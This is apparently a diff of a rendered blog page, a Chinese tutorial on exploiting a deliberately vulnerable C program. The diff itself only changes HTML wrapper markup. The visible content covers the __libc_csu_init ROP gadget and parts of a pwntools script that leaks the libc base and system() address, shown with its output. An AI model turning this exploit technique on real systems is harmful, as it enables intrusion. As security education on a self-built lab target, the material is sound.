@@ -67,12 +67,11 @@
     <article class="markdown-body">
         <p>本篇的代码和之前的略有修改，diff 是这样的。</p>
 
-<div class="language-diff highlighter-rouge"><pre class="highlight"><code>26c26
+<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code>26c26
 &lt;         write(1, "You Are Naive.\n", 15);
 ---
 &gt;         printf("You Are Naive.\n");
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>其实是为了强行构造漏洞… 编译参数为 <code class="highlighter-rouge">gcc -g -O0 -fno-stack-protector -o vuln main.c</code>，需要开启 aslr。</p>
 
@@ -87,7 +86,7 @@
 
 <p>其实在使用了 libc 的二进制程序中，基本上都有一段最多可以写三个参数寄存器的通用 gadget，就在函数 <code class="highlighter-rouge">__libc_csu_init</code> 中。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ pdisas __libc_csu_init
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ pdisas __libc_csu_init
 Dump of assembler code for function __libc_csu_init:
    0x00000000004007e0 &lt;+0&gt;:	push   r15
    0x00000000004007e2 &lt;+2&gt;:	push   r14
@@ -124,8 +123,7 @@ Dump of assembler code for function __libc_csu_init:
    0x0000000000400842 &lt;+98&gt;:	pop    r15
    0x0000000000400844 &lt;+100&gt;:	ret
 End of assembler dump.
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>这个 gadget 的流程是这样的</p>
 
@@ -135,7 +133,7 @@ End of assembler dump.
 
 <p>如果看懂了上面的图，那很容易就可以使用这个 gadget，下面是一个泄露 libc 基地址的 shellcode</p>
 
-<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="c"># coding=utf-8</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># coding=utf-8</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">student</span> <span class="o">=</span> <span class="mh">0x7fffffffe2f0</span>
 
@@ -166,12 +164,11 @@ End of assembler dump.
 
 <span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">]</span>
 <span class="k">print</span><span class="p">(</span><span class="s">"system addr "</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>运行结果是</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>➜  new python shellcode.py
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  new python shellcode.py
 [*] '/home/virusdefender/Desktop/pwn/new/vuln'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -195,12 +192,11 @@ You Spend One Second Here.
     PIE:      PIE enabled
 ('libc base addr ', '0x7f4314e96000')
 ('system addr ', '0x7f4314edb390')
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p><code class="highlighter-rouge">vmmap</code> 的结果如下，可以看到和 shellcode 的输出一致。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ vmmap
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ vmmap
 Start              End                Perm	Name
 0x00400000         0x00401000         r-xp	/home/virusdefender/Desktop/pwn/new/vuln
 0x00600000         0x00601000         r--p	/home/virusdefender/Desktop/pwn/new/vuln
@@ -221,8 +217,7 @@ Start              End                Perm	Name
 0x00007ffc9b5fb000 0x00007ffc9b5fd000 r--p	[vvar]
 0x00007ffc9b5fd000 0x00007ffc9b5ff000 r-xp	[vdso]
 0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
-</code></pre>
-</div>
+</code></pre></div></div>
 
 
 
